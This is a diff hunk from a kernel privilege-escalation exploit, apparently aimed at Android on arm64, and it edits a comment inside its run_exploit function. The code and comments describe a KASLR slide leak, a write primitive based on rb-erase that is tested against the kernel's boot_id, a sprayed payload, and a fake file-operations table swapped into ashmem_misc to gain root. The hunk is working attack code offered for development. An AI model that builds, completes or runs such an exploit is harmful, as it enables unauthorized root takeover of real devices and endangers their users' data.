@@ -356,12 +356,15 @@ int run_exploit(int argc, char **argv) {
   kaslr_done = 1;
   pr_success("direct-map base=%016llx slide=%016llx\n", kaslr_base, kaslr_slide);
 
-  /* Spend route attempt 1 on the BOOTID write-proof: the rb-erase store goes to
-   * &sysctl_bootid instead of &ashmem_misc.fops, so /proc/sys/kernel/random/boot_id
-   * changing is direct, harmless, non-circular proof that the chain-walk store
-   * executes here. Must be set BEFORE prepare_good_kernel_page(), which bakes
-   * pselect_write_target() into the sprayed payload. Attempts 2+ re-groom with
-   * the real fops target and go for root. */
+  /* BOOTID write-proof: the rb-erase store goes to &sysctl_bootid instead of
+   * &ashmem_misc.fops, so /proc/sys/kernel/random/boot_id changing is direct,
+   * harmless, non-circular proof that the chain-walk store executes here. Must
+   * be set BEFORE prepare_good_kernel_page(), which bakes pselect_write_target()
+   * into the sprayed payload.
+   * The fops swap is intentionally NOT attempted while this is on: kaslr_base
+   * below is a placeholder, so the fake fops table holds linear-map aliases,
+   * which arm64 maps PXN -- misc_open() calling f_op->open would panic. Set
+   * BOOTID_WRITE_PROOF=0 only once the real KASLR base is leaked. */
   bootid_proof_active = bootid_write_proof_enabled();
   if (bootid_proof_active) {
     read_first_line("/proc/sys/kernel/random/boot_id", bootid_proof_before,
